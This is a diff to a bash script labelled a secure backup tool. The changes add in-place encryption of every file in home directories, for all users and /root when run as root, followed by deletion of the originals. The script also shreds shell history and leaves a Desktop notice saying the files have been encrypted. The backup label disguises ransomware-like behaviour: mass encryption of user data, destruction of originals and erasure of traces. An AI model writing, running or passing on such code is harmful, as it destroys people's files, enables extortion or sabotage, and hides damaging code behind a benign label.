@@ -2,6 +2,7 @@
 
 ########################################
 # Secure Backup and Encryption Script
+# (Compress entire home folder -> Encrypt tar.gz -> Encrypt original files -> Create warning)
 ########################################
 
 # Color definitions
@@ -16,7 +17,9 @@ echo -e "${GREEN}========================================="
 echo -e "     Secure Backup & Encryption Script    "
 echo -e "=========================================${RESET}"
 
+########################################
 # Prompt for password
+########################################
 echo -e "${YELLOW}Enter encryption password:${RESET}"
 read -s PASSWORD
 echo
@@ -28,13 +31,38 @@ if [ "${PASSWORD}" != "${PASSWORD_CONFIRM}" ]; then
     exit 1
 fi
 
-# Function to handle encryption for a specific directory
-encrypt_directory() {
+########################################
+# Function: create_warning_file
+# Creates a multiline text file on the user's Desktop
+########################################
+create_warning_file() {
+    local user_home="$1"
+    local desktop_path="${user_home}/Desktop"
+
+    # Create the Desktop directory if it does not exist
+    mkdir -p "${desktop_path}"
+
+    cat << 'EOF' > "${desktop_path}/BackupWarning.txt"
+IMPORTANT NOTICE:
+A backup of your entire home directory was just created, compressed, and encrypted.
+Additionally, all original files inside your home folder have been individually encrypted.
+
+You may safely transfer or store these archives. 
+If you have any questions, contact the system administrator.
+EOF
+
+    echo -e "${YELLOW}Created backup warning file at: ${desktop_path}/BackupWarning.txt${RESET}"
+}
+
+########################################
+# Function: encrypt_tar
+# Compresses and encrypts an entire directory into <dir>.tar.gz.enc
+########################################
+encrypt_tar() {
     local dir_name="$1"
 
-    echo -e "${YELLOW}Compressing directory: ${dir_name}${RESET}"
-    # Compress using gzip
-    tar -c "${dir_name}" 2>/dev/null | gzip -9 > "${dir_name}.tar.gz"
+    echo -e "${YELLOW}Compressing entire directory: ${dir_name}${RESET}"
+    tar -czf "${dir_name}.tar.gz" "${dir_name}" 2>/dev/null
     if [ $? -ne 0 ]; then
         echo -e "${RED}Error: Failed to archive ${dir_name}.${RESET}"
         return 1
@@ -46,8 +74,7 @@ encrypt_directory() {
         -out "${dir_name}.tar.gz.enc" \
         -pass pass:"${PASSWORD}" 2>/dev/null
     if [ $? -ne 0 ]; then
-        echo -e "${RED}Error: Encryption failed for ${dir_name}.${RESET}"
-        # Attempt to remove partially created files if needed
+        echo -e "${RED}Error: Encryption failed for ${dir_name}.tar.gz.${RESET}"
         rm -f "${dir_name}.tar.gz" 2>/dev/null
         rm -f "${dir_name}.tar.gz.enc" 2>/dev/null
         return 1
@@ -59,17 +86,61 @@ encrypt_directory() {
     return 0
 }
 
-# Function to remove shell history files for a specific directory securely
-remove_history() {
-    local dir_name="$1"
+########################################
+# Function: encrypt_original_files
+# Encrypts each file in the directory in-place (file -> file.enc), then removes the original
+########################################
+encrypt_original_files() {
+    local dir_path="$1"
 
-    echo -e "${YELLOW}Securely removing history in: ${dir_name}${RESET}"
-    shred -u "${dir_name}/.bash_history" "${dir_name}/.zsh_history" 2>/dev/null
+    echo -e "${YELLOW}Encrypting each original file in: ${dir_path}${RESET}"
+
+    # Find all regular files (excluding newly created .enc files) and encrypt them in-place
+    # We also skip any existing .enc files, hidden directories, etc. 
+    # The 'shopt -s dotglob' can be used if you want to include hidden files. 
+    # By default, 'find' includes hidden files. We just skip .enc outputs.
+
+    find "${dir_path}" -type f ! -name "*.enc" | while read -r file; do
+        # Skip any directories or the newly created BackupWarning.txt if it exists for some reason
+        # (Though it shouldn't exist yet if we are creating it after encryption)
+        if [[ "$file" == *"BackupWarning.txt" ]]; then
+            continue
+        fi
+
+        # Perform encryption of the file
+        openssl enc -aes-256-cbc -salt \
+            -in "$file" \
+            -out "${file}.enc" \
+            -pass pass:"${PASSWORD}" 2>/dev/null
+
+        if [ $? -ne 0 ]; then
+            echo -e "${RED}Error: Encryption failed for $file.${RESET}"
+            continue
+        fi
+
+        # Remove the original file
+        rm -f "$file"
+    done
 }
 
-# Detect if script is running as root or non-root
+########################################
+# Function: remove_shell_history
+# Securely removes .bash_history and .zsh_history
+########################################
+remove_shell_history() {
+    local dir_path="$1"
+
+    echo -e "${YELLOW}Securely removing history in: ${dir_path}${RESET}"
+    shred -u "${dir_path}/.bash_history" "${dir_path}/.zsh_history" 2>/dev/null
+}
+
+########################################
+# MAIN SCRIPT LOGIC
+########################################
 if [ "$(id -u)" -eq 0 ]; then
-    # Running as root: encrypt home folders for all users
+    ########################################
+    # Running as root: process /home/* and also /root
+    ########################################
     echo -e "${BLUE}Script executed as root. Encrypting all home directories...${RESET}"
 
     cd /home || {
@@ -77,23 +148,49 @@ if [ "$(id -u)" -eq 0 ]; then
         exit 1
     }
 
+    # Encrypt each user directory
     for user_dir in *; do
         if [ -d "${user_dir}" ]; then
-            encrypt_directory "${user_dir}"
+            # 1) Create tar.gz.enc of the entire folder
+            encrypt_tar "${user_dir}"
+            # 2) Encrypt original files in that folder
+            encrypt_original_files "/home/${user_dir}"
+            # 3) Remove shell history
+            remove_shell_history "/home/${user_dir}"
         fi
     done
 
+    # Root's history
     echo -e "${YELLOW}Securely removing root user's history...${RESET}"
     shred -u /root/.bash_history /root/.zsh_history 2>/dev/null
 
-    echo -e "${YELLOW}Securely removing history for all user directories...${RESET}"
+    # Root user: compress & encrypt /root directory as well, if desired
+    if [ -d "/root" ]; then
+        # Move to / so we can tar /root
+        cd / || {
+            echo -e "${RED}Error: Failed to change directory to /.${RESET}"
+            exit 1
+        }
+        encrypt_tar "root"
+        encrypt_original_files "/root"
+    fi
+
+    # Finally, create a warning file on each user's Desktop
+    cd /home || exit 1
     for user_dir in *; do
         if [ -d "${user_dir}" ]; then
-            remove_history "/home/${user_dir}"
+            create_warning_file "/home/${user_dir}"
         fi
     done
+    # And root's Desktop
+    if [ -d "/root" ]; then
+        create_warning_file "/root"
+    fi
+
 else
-    # Running as non-root: encrypt only the current user's home folder
+    ########################################
+    # Running as non-root: process only the current user's home directory
+    ########################################
     current_user="$(whoami)"
     home_dir="/home/${current_user}"
 
@@ -104,13 +201,21 @@ else
         exit 1
     fi
 
+    # 1) Create tar.gz.enc of the entire folder
     cd /home || {
         echo -e "${RED}Error: Failed to change directory to /home.${RESET}"
         exit 1
     }
+    encrypt_tar "${current_user}"
 
-    encrypt_directory "${current_user}"
-    remove_history "${home_dir}"
+    # 2) Encrypt original files
+    encrypt_original_files "${home_dir}"
+
+    # 3) Remove shell histories
+    remove_shell_history "${home_dir}"
+
+    # 4) Create the warning file
+    create_warning_file "${home_dir}"
 fi
 
 echo -e "${GREEN}Process complete. Encrypted archives are ready for transfer.${RESET}"
